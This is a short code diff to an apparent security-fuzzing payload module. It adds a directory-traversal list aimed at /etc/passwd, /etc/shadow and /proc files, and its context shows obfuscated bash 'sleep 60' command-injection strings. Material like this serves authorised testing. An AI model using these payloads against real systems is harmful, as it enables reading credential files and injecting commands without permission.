@@ -6,6 +6,16 @@ def bash_time_payloads():
             r"\s\l\e\e\p \6\0 #",
             r"$(echo -e '\x73\x6C\x65\x65\x70\x20\x36\x30') #"]
 
+def directory_traversal_payloads():
+    return ["/boot/grub/grub.conf",
+            "/etc/passwd",
+            "/.gitignore",
+            "/etc/shadow",
+            "/php.conf",
+            "/proc/cpuinfo",
+            "/proc/interrupts",
+            "/proc/meminfo"]
+
 def emoji_payloads():
     return [r"&#128124;",
             r"&#128293;",
